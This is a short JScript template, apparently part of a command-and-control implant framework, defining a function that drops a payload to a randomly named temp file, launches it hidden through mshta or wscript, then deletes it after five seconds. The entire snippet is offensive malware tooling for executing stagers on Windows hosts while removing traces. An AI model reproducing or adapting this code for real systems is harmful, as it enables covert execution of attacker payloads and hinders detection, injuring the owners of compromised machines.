function spawn(data, stager_format){
  try {
    stager_comspec = {"hta":["mshta "], "js":["wscript /e:jscript "]}
    var path = {{variables['tmp'][1]}} + "\\" + "{{ random_string }}" + "." + stager_format;
    upload(data, path);
    {{variables['wscript.shell'][0]}}.Run(stager_comspec[stager_format] + path, 0, false);
    var now = new Date().getTime();
    while((new Date().getTime() - now) < 5000){
      // do nothing
    }
    delfile(path);
    return 'Executed: ( ' + stager_comspec[stager_format] + path + ' )';
  } catch (e) {
    return 'Failed to spawn stager: ' + e.message;
  }
}
